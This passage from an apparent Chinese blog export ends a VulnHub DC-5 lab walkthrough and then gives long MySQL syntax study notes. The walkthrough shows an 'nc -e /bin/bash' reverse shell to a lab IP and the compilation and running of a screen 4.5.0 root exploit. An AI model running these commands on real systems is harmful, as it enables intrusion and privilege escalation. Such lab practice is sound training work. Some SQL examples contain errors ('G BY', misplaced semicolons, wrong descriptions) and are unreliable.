<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.254.128 <span class="token number">1234</span></code></pre>

<img src="/2022/04/20/VulnHub-DC-5/image-20220421135146296.png" class="" title="image-20220421135146296" loading="lazy">

<p>成功拿到shell！</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421135616859.png" class="" title="image-20220421135616859" loading="lazy">

<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>先搞个交互式shell。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>

<p>看看能不能提权。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>

<img src="/2022/04/20/VulnHub-DC-5/image-20220421135854083.png" class="" title="image-20220421135854083" loading="lazy">

<p>发现了可疑文件，查找一下相关漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ searchsploit <span class="token function">screen</span> <span class="token number">4.5</span>.0</code></pre>

<img src="/2022/04/20/VulnHub-DC-5/image-20220420170215484.png" class="" title="image-20220420170215484" loading="lazy">

<p>复制过来，上传到靶机上执行，报错</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421144325278.png" class="" title="image-20220421144325278" loading="lazy">

<p>看看脚本怎么写的</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421144637143.png" class="" title="image-20220421144637143" loading="lazy">

<p>可以分为三个部分：前两个部分为<code>c语言程序</code>，第三部分为<code>shell脚本</code></p>
<p>结合错误分析，应该是前两个部分编译文件时出了问题，无法正常编译导致文件找不到</p>
<p>因此只能在本地编译好后分开上传再执行</p>
<p>先将前两个程序编译好</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
$ gcc -o /tmp/rootshell /tmp/rootshell.c</code></pre>

<blockquote>
<p>-fPIC 参数表明使用地址无关代码。</p>
<p>-shared 参数表明产生共享库。</p>
<p>-ldl 其中参数-l为连接一个共享库，dl表示名为libdl.a的静态库。</p>
</blockquote>
<p>在<code>/tmp</code>目录下会生成两个文件</p>
<p>将第三部分作为一个单独的文件</p>
<p>共三个文件，上传到靶机的<code>/tmp</code>目录下</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421145410320.png" class="" title="image-20220421145410320" loading="lazy">

<p>给<code>41154.sh</code>添加执行权限并执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> +x <span class="token number">41154</span>.sh
$ ./41154.sh</code></pre>

<img src="/2022/04/20/VulnHub-DC-5/image-20220421145515037.png" class="" title="image-20220421145515037" loading="lazy">

<p>成功提权！</p>
<p>成功拿到flag！</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421145559822.png" class="" title="image-20220421145559822" loading="lazy">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="学到的知识点"><a href="#学到的知识点" class="headerlink" title="学到的知识点"></a>学到的知识点</h2><ol>
<li>敏感文件检索</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://blog.csdn.net/kukudeshuo/article/details/118709469">vulnhub靶场，DC-5</a></li>
<li><a href="https://blog.csdn.net/rpsate/article/details/119769130?spm=1001.2014.3001.5502">vulnhub DC5 靶场练习</a></li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql</title>
    <url>/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇博客是学习mysql时的一些笔记，主要是SQL语言的学习，例表来源于尚硅谷，在B站上有视频资料可以学习。</p>
<h1 id="进阶1-基础查询"><a href="#进阶1-基础查询" class="headerlink" title="进阶1-基础查询"></a>进阶1-基础查询</h1><ul>
<li><p>语法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	查询列表
FROM
	表名;</code></pre>

<p>类似于System.out.println(“”);</p>
</li>
<li><p>特点：</p>
<p>查询列表可以是：字段、常量、表达式、函数</p>
</li>
</ul>
<h2 id="查单个字段"><a href="#查单个字段" class="headerlink" title="查单个字段"></a>查单个字段</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	last_name 
FROM
	employees;</code></pre>

<h2 id="查多个字段"><a href="#查多个字段" class="headerlink" title="查多个字段"></a>查多个字段</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT 
	last_name,
	first_name 
FROM 
	employees;</code></pre>

<h2 id="查询所有字段"><a href="#查询所有字段" class="headerlink" title="查询所有字段"></a>查询所有字段</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT 
	* 
FROM 
	employees;</code></pre>

<h2 id="查询常量"><a href="#查询常量" class="headerlink" title="查询常量"></a>查询常量</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT 1;
SELECT &#39;flag&#39;;</code></pre>

<h2 id="查询表达式"><a href="#查询表达式" class="headerlink" title="查询表达式"></a>查询表达式</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT 100%98;</code></pre>

<h2 id="查询函数"><a href="#查询函数" class="headerlink" title="查询函数"></a>查询函数</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT VERSION();</code></pre>

<h2 id="起别名"><a href="#起别名" class="headerlink" title="起别名"></a>起别名</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT 100%98 AS solution;
SELECT last_name AS &quot;姓&quot;,first_name AS 名 FROM employees;
SELECT last_name 姓,first_name 名 FROM employees;
SELECT employees_id AS &quot;out put&quot; FROM employees;</code></pre>

<h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT DISTINCT employees_id FROM employees;</code></pre>

<h2 id="的作用"><a href="#的作用" class="headerlink" title="+的作用"></a>+的作用</h2><ul>
<li><p>java中的+</p>
<p>1、运算符：两个数据都为数值时<br>2、链接符：只要有一个为字符串</p>
</li>
<li><p>mysql中的+</p>
<p>仅为运算符</p>
<p>1、当两个操作数都为数值时，做常规的加法。<br>SELECT 1+2;<br>2、只要其中一个为字符型，试图转换字符为数值，失败时将字符型转为0。<br>SELECT ‘a’+1;<br>3、只要存在一个null，结果为null。<br>SELECT null+1+2+3;</p>
</li>
</ul>
<h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
CONCAT(&#39;a&#39;,&#39;b&#39;) AS &quot;name&quot;;</code></pre>

<h1 id="进阶2-条件查询-where"><a href="#进阶2-条件查询-where" class="headerlink" title="进阶2-条件查询-where"></a>进阶2-条件查询-where</h1><ul>
<li><p>语法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">select
	查询列表
from
	表名
where
	筛选条件;</code></pre>
</li>
<li><p>分类：</p>
<p>1、条件运算符：&gt; 、&lt; 、 &#x3D; 、 !&#x3D; 、 &lt;&gt; 、 &gt;&#x3D; 、 &lt;&#x3D;</p>
<p>2、逻辑运算符：&amp;&amp; 、 || 、 ！ 、 and 、 or 、 not</p>
<p>3、模糊查询：like 、 between and 、 in 、 is null</p>
</li>
</ul>
<h2 id="按条件表达式筛选"><a href="#按条件表达式筛选" class="headerlink" title="按条件表达式筛选"></a>按条件表达式筛选</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	last_name
FROM
	employees
WHERE
	id&gt;1;</code></pre>

<h2 id="按逻辑表达式筛选"><a href="#按逻辑表达式筛选" class="headerlink" title="按逻辑表达式筛选"></a>按逻辑表达式筛选</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	last_name
FROM
	employees
WHERE
	employees_id&gt;1 
AND
	employees_id&lt;5;</code></pre>

<h2 id="模糊筛选"><a href="#模糊筛选" class="headerlink" title="模糊筛选"></a>模糊筛选</h2><h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><p>特点：一般和通配符搭配使用</p>
<p>通配符：</p>
<p> %：任意匹配多个字符，包含0个字符</p>
<p> _：任意单个字符</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工名字中第二个字符为a且第3个字符为_的员工信息
SELECT
	*
FROM
	employees
WHERE
	last_name LIKE &#39;_a\_%&#39;;</code></pre>

<p>escape：将字符定义为转义前缀，未规定时默认为\</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工名字中第二个字符为a且第3个字符为_的员工信息
SELECT
	*
FROM
	employees
WHERE
	last_name LIKE &#39;_a$_%&#39; ESCAPE &#39;$&#39;;</code></pre>

<h3 id="between-and"><a href="#between-and" class="headerlink" title="between and"></a>between and</h3><p>特点：包含临界值，左小右大</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工编号在100到120之间的员工信息
SELECT
	*
FROM
	employees
WHERE
	employees_id BETWEEN 100 AND 120;</code></pre>

<h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>特点：in列表的值的类型必须一致，不支持通配符</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工的工种编号是IT_PROG、AD_VIP、AD_PRES中的一个的员工信息
SELECT
	*
FROM
	employees
WHERE
	job_id IN (&#39;IT_PROG&#39;,&#39;AD_VIP&#39;,&#39;AD_PRES&#39;);	#job_id &#x3D; &#39;IT_PROG&#39; OR job_id &#x3D; &#39;AD_VIP&#39; OR job_id &#x3D; &#39;AD_PRES&#39;;</code></pre>

<h3 id="is-null"><a href="#is-null" class="headerlink" title="is null"></a>is null</h3><p>特点：&#x3D;或!&#x3D;不能匹配null，null可以搭配is或者安全等于&lt;&#x3D;&gt;</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询没有奖金的员工名和奖金率
SELECT
	last_name,
	commission_pct
FROM
	employees
WHERE
	comission_pct IS NOT NULL;</code></pre>

<h1 id="进阶3-排序查询-order-by"><a href="#进阶3-排序查询-order-by" class="headerlink" title="进阶3-排序查询-order by"></a>进阶3-排序查询-order by</h1><ul>
<li>语法</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	查询列表
FROM
	表
WHERE
	筛选条件
ORDER BY 
	排序列表 ASC|DESC;</code></pre>

<ul>
<li>特点</li>
</ul>
<ol>
<li>asc代表升序，desc代表降序，如果不写默认升序</li>
<li>order by支持单个字段、多个字段、表达式、函数、别名</li>
<li>order by子句一般放在最后面，只有limit放在他后面</li>
</ol>
<h1 id="进阶4-常见函数"><a href="#进阶4-常见函数" class="headerlink" title="进阶4-常见函数"></a>进阶4-常见函数</h1><h2 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h2><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><p>获取参数值的<strong>字节</strong>个数</p>
<p>注意，在不同编码中，中文所占字节长度不同</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT LENGTH(&#39;nayst&#39;);
SELECT LENGTH(&#39;nayst的小站&#39;) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711105013183.png" class="" title="image-20210711105013183" loading="lazy">

<h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><p>拼接字符串</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	CONCAT(last_name,&#39;_&#39;,firstname) AS 姓名 
FROM 
	employees;</code></pre>

<h3 id="upper、lower"><a href="#upper、lower" class="headerlink" title="upper、lower"></a>upper、lower</h3><p>将字符串转为小写（小写）</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT UPPER(&#39;nayst&#39;);</code></pre>

<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><p>截取从指定索引处后指定长度的字符，未规定时默认截取后面所有字符</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT SUBSTR(&#39;nayst is a handsome man&#39;, 12) AS out_put;
SELECT SUBSTR(&#39;nayst is a handsome man&#39;, 12, 8) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711105138707.png" class="" title="image-20210711105138707" loading="lazy">

<h3 id="instr"><a href="#instr" class="headerlink" title="instr"></a>instr</h3><p>返回子串第一次出现的索引，找不到返回0</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT INSTR(&#39;nayst is a handsome man&#39;,&#39;an&#39;) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711105251284.png" class="" title="image-20210711105251284" loading="lazy">

<h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p>删除字符串前后的指定内容，未规定时默认删除空格</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT TRIM(&#39;aa&#39; FROM &#39;aaaaaaanaystaaa&#39;) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711105634508.png" class="" title="image-20210711105634508" loading="lazy">

<h3 id="lpad、rpad"><a href="#lpad、rpad" class="headerlink" title="lpad、rpad"></a>lpad、rpad</h3><p>用指定字符从左边（右边）开始填充至指定长度</p>
<p>注意，当指定长度小于字符长度时会产生截断</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT LPAD(&#39;nayst&#39;,10,&#39;-&#39;) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711105838516.png" class="" title="image-20210711105838516" loading="lazy">

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT LPAD(&#39;nayst&#39;,3,&#39;-&#39;) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711105932452.png" class="" title="image-20210711105932452" loading="lazy">

<h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>替换指定字符</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT REPLACE(&#39;nayst is a handsome man&#39;,&#39;handsome&#39;,&#39;nice&#39;) AS out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711110242622.png" class="" title="image-20210711110242622" loading="lazy">

<h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3><p>对指定数值的绝对值四舍五入，可以规定四舍五入到第几位，未规定时默认整数位</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT ROUND(-1.567,2);</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711110723275.png" class="" title="image-20210711110723275" loading="lazy">

<h3 id="ceil、floor"><a href="#ceil、floor" class="headerlink" title="ceil、floor"></a>ceil、floor</h3><p>向上（下）取整，返回该&gt;&#x3D;（&lt;&#x3D;）该参数的最小整数</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT CEIL(-1.02) out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711110949281.png" class="" title="image-20210711110949281" loading="lazy">

<h3 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h3><p>从小数点后指定位数截断，即保留指定位数的小数</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT TRUNCATE(1.12345,3);</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711111137125.png" class="" title="image-20210711111137125" loading="lazy">

<h3 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h3><p>取余，等价于%</p>
<p>遇到负数时可以参考这个公式：MOD(a,b)&#x3D;a-a&#x2F;b*b</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT MOD(10,3);</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711111308203.png" class="" title="image-20210711111308203" loading="lazy">

<h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><h3 id="now"><a href="#now" class="headerlink" title="now"></a>now</h3><p>返回当前日期+时间</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT NOW();</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711111627538.png" class="" title="image-20210711111627538" loading="lazy">

<h3 id="curdate"><a href="#curdate" class="headerlink" title="curdate"></a>curdate</h3><p>只返回当前的日期</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT CURDATE();</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711111711002.png" class="" title="image-20210711111711002" loading="lazy">

<h3 id="curtime"><a href="#curtime" class="headerlink" title="curtime"></a>curtime</h3><p>只返回当前的时间</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT CURTIME();</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711111739581.png" class="" title="image-20210711111739581" loading="lazy">

<h3 id="获取指定的部分"><a href="#获取指定的部分" class="headerlink" title="获取指定的部分"></a>获取指定的部分</h3><p>获取日期中的年、月、日、小时、分钟、秒</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT YEAR(NOW()) 年;
SELECT YEAR(&#39;2021-7-11&#39;) 年;
SELECT YEAR(hiredate) 年 FROM employees;
SELECT MONTH(NOW()) 月;
SELECT MONTHNAME(NOW()) &#39;month&#39;;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711132001916.png" class="" title="image-20210711132001916" loading="lazy">

<h2 id="流程控制函数"><a href="#流程控制函数" class="headerlink" title="流程控制函数"></a>流程控制函数</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT IF(10&lt;5,&#39;true&#39;,&#39;false&#39;) out_put;</code></pre>

<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210711133058188.png" class="" title="image-20210711133058188" loading="lazy">

<h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;*查询员工的工资
部门号&#x3D;30，显示的工资为原工资1.1倍
部门号&#x3D;40，显示的工资为原工资1.2倍
部门号&#x3D;50，显示的工资为原工资1.3倍
其他部门，显示的工资为原工资*&#x2F;
SELECT
	salary 原工资,
	department_id,
CASE
		department_id 
		WHEN 30 THEN
		salary * 1.1 
		WHEN 40 THEN
		salary * 1.2 
		WHEN 50 THEN
		salary * 1.3 ELSE salary 
	END AS 新工资
FROM
	employees;</code></pre>

<h2 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h2><p>功能：用作统计使用，又称聚合函数或统计函数</p>
<p>分类：sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT SUM(salary) 总工资 FROM employees;
SELECT AVG(salary) 平均工资 FROM employees;
SELECT MIN(salary) 最少工资 FROM employees;
SELECT MAX(salary) 最大工资 FROM employees;
SELECT COUNT(salary) 总工资数 FROM employees;</code></pre>

<p>特点：</p>
<ol>
<li><p>sum、avg一般用于处理数值型</p>
<p>max、min、count可以处理任何类型</p>
</li>
<li><p>以上分组都可以忽略null值</p>
</li>
<li><p>可以和distinct搭配实现去重的运算</p>
</li>
<li><p>count(*)、count(1)可以统计行数</p>
</li>
<li><p>和分组函数一同查询的字段要求是group by后的字段</p>
</li>
</ol>
<h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT VERSION();
SELECT DATABASE();
SELECT USER();</code></pre>

<h1 id="进阶5-分组查询-group-by"><a href="#进阶5-分组查询-group-by" class="headerlink" title="进阶5-分组查询-group by"></a>进阶5-分组查询-group by</h1><ul>
<li><p>语法</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	分组函数,列（要求出现在group by的后面）
FROM
	表 
[WHERE 
 	筛选条件]
GROUP BY
	分组的列表 [ORDER BY子句]</code></pre>
</li>
<li><p>注意：查询列表必须特殊，要求是分组函数和group by后出现的字段</p>
</li>
<li><p>特点：</p>
<p>分组查询中的筛选条件分为两类</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">数据源</th>
<th align="center">位置</th>
<th align="center">关键字</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>查询前筛选</strong></td>
<td align="center">原始表</td>
<td align="center">group by子句的前面</td>
<td align="center">where</td>
</tr>
<tr>
<td align="center"><strong>查询后筛选</strong></td>
<td align="center">分组后的结果集</td>
<td align="center">group by子句的后面</td>
<td align="center">having</td>
</tr>
</tbody></table>
<ol>
<li>分组函数做条件肯定是放在having子句中</li>
<li>能用分组前筛选的就优先考虑使用分组前筛选</li>
</ol>
</li>
</ul>
<h2 id="简单的分组查询"><a href="#简单的分组查询" class="headerlink" title="简单的分组查询"></a>简单的分组查询</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询每个工种的最高工资
SELECT
	MAX(salary),
	job_id
FROM
	employees
GROUP BY
	job_id;</code></pre>

<h3 id="查询前筛选"><a href="#查询前筛选" class="headerlink" title="查询前筛选"></a>查询前筛选</h3><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询邮箱中包含a字符的，每个部门的平均工资
SELECT
	AVG(salary),
	department_id
FROM
	employees
WHERE
	email LIKE &#39;%a%&#39;
GROUP BY
	department_id;</code></pre>

<h3 id="查询后筛选"><a href="#查询后筛选" class="headerlink" title="查询后筛选"></a>查询后筛选</h3><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询哪个部门的员工个数&gt;2
#1.查询每个部门的员工个数
SELECT
	COUNT(*),
	department_id
FROM
	employees
GROUP BY
	department_id;
#2.根据1的结果筛选哪个部门员工个数&gt;2
SELECT
	COUNT(*),
	department_id
FROM
	employees
G BY
	department_id
HAVING
	COUNT(*)&gt;2;</code></pre>

<h2 id="按函数分组查询"><a href="#按函数分组查询" class="headerlink" title="按函数分组查询"></a>按函数分组查询</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#按员工姓名长度分组，查询每一组的员工个数，筛选员工个数&gt;5的有哪些
#1.查询每个长度的员工个数
SELECT
	COUNT(*),
	LENGTH(last_name) len_name
FROM
	employees
GROUP BY
	LENGTH(last_name);
#2.添加筛选条件
SELECT
	COUNT(*) c,
	LENGTH(last_name) len_name
FROM
	employees
GROUP BY
	len_name
HAVING
	c&gt;5;</code></pre>

<h2 id="按多个字段分组"><a href="#按多个字段分组" class="headerlink" title="按多个字段分组"></a>按多个字段分组</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询每个部门每个工种的员工的平均工资
SELECT
	AVG(salary),
	department_id,
	job_id
FROM
	employees
GROUP BY
	department_id,
	job_id;</code></pre>

<h2 id="添加排序"><a href="#添加排序" class="headerlink" title="添加排序"></a>添加排序</h2><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询每个部门每个工种的员工的平均工资，并按平均工资降序排序
SELECT
	AVG(salary),
	department_id,
	job_id
FROM
	employees
GROUP BY
	department_id,
	job_id;
ORDER BY
	AVG(salary) DESC;</code></pre>

<h1 id="进阶6-连接查询-join"><a href="#进阶6-连接查询-join" class="headerlink" title="进阶6-连接查询-join"></a>进阶6-连接查询-join</h1><ul>
<li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p>
</li>
<li><p>分类：</p>
<ul>
<li><p>按年代分类</p>
<blockquote>
<p>sql92标准</p>
<p>sql99标准（推荐）</p>
</blockquote>
</li>
<li><p>按功能分类</p>
<blockquote>
<p>内连接：</p>
<blockquote>
<p>等值连接</p>
<p>非等值连接</p>
<p>自连接</p>
</blockquote>
<p>外连接：</p>
<blockquote>
<p>左外连接</p>
<p>右外连接</p>
<p>全外连接</p>
</blockquote>
<p>交叉连接</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210712085620802.png" class="" title="image-20210712085620802" loading="lazy">

<h2 id="sql92语法"><a href="#sql92语法" class="headerlink" title="sql92语法"></a>sql92语法</h2><h3 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h3><ul>
<li>特点：需要查询的内容需要访问其他表<ul>
<li>可以添加筛选</li>
<li>可以添加分组</li>
<li>可以添加排序</li>
</ul>
</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询女神名和对应的男神名
SELECT 
	NAME,boyName
FROM
	boys,beauty
WHERE
	beauty.boyfriend_id &#x3D; boys.id;</code></pre>

<h4 id="为表起别名"><a href="#为表起别名" class="headerlink" title="为表起别名"></a>为表起别名</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工名、工种名、工种号
SELECT
	e.last_name,
	e.job_id,
	j.job_id,
	j.job_title
FROM
	employees AS e,jobs AS j	#AS可以省略
WHERE
	e.&#96;job_id&#96; &#x3D; j.&#96;job_id&#96;;</code></pre>

<h3 id="非等值连接"><a href="#非等值连接" class="headerlink" title="非等值连接"></a>非等值连接</h3><img src="/2021/07/10/mysql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210712091302987.png" class="" title="image-20210712091302987" loading="lazy">

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工的工资和工资筛选级别为A
SELECT
	salary,
	grade_level
FROM
	employees e,
	job_grades g
WHERE
	salary BETWEEN g.&#96;lowest_sal&#96; AND g.&#96;highest_sal&#96;
AND
	g.&#96;grade_level&#96; &#x3D; &#39;A&#39;;</code></pre>

<h3 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h3><ul>
<li>特点：类似于等值连接，需要查询的内容需要再次访问当前表</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工名和对应上级的名称
SELECT
	e.last_name,
	m.last_name
FROM
	employees e,
	employees m
WHERE
	e.&#96;manager_id&#96; &#x3D; m.&#96;employee_id&#96;;
	</code></pre>

<h2 id="sql99语法（推荐）"><a href="#sql99语法（推荐）" class="headerlink" title="sql99语法（推荐）"></a>sql99语法（推荐）</h2><ul>
<li>语法</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	查询列表
FROM
	表1 别名 [连接类型]
JOIN
	表2 别名
ON
	连接条件
[WHERE]
[GROUP BY]
[HAVING]
[ORDER BY]</code></pre>

<h3 id="内连接-inner"><a href="#内连接-inner" class="headerlink" title="内连接-inner"></a>内连接-inner</h3><ul>
<li>特点：查询的内容在各自表中都有</li>
</ul>
<h4 id="等值连接-1"><a href="#等值连接-1" class="headerlink" title="等值连接"></a>等值连接</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工名、部门名
SELECT
	last_name,
	department_name
FROM
	employees e
[INNER] JOIN
	departments d
ON
	e.&#96;department_id&#96; &#x3D; d.&#96;department_id&#96;;</code></pre>

<h4 id="非等值连接-1"><a href="#非等值连接-1" class="headerlink" title="非等值连接"></a>非等值连接</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工每个工资级别的&gt;20的个数，并按工资级别降序
SELECT
	COUNT(*),
	grade_level
FROM
	employees e
JOIN
	job_grade g
GROUP BY
	grade_level
HAVING
	COUNT(*)&gt;20
ORDER BY
	grade_level DESC;</code></pre>

<h4 id="自连接-1"><a href="#自连接-1" class="headerlink" title="自连接"></a>自连接</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询员工名字和上级的名字
SELECT
	e.last_name,
	m.last_name
FROM
	employees e
JOIN
	employees m
ON
	e.&#96;manager_id&#96; &#x3D; m.&#96;employees_id&#96;;</code></pre>

<h3 id="外连接-outer"><a href="#外连接-outer" class="headerlink" title="外连接-outer"></a>外连接-outer</h3><ul>
<li><p>特点：查询一个表中有，另一个表中没有的记录</p>
<ul>
<li><p>外连接的查询结果为主表中的所有记录</p>
<p>如果从表中没有和它匹配的则显示null</p>
<p>外连接查询结果 &#x3D; 内连接结果 + 主表有儿从表中没有的记录</p>
<p>全外查询结果&#x3D;内连接结果+表1中有但表2中没有+表2中有但表1中没有的</p>
</li>
<li><p>左外连接：left join左边的是主表</p>
<p>右外连接：right join右边的是主表</p>
<p>全外连接：full</p>
</li>
<li><p>左外和右外交换两个表的顺序，可以实现同样的效果</p>
</li>
</ul>
</li>
</ul>
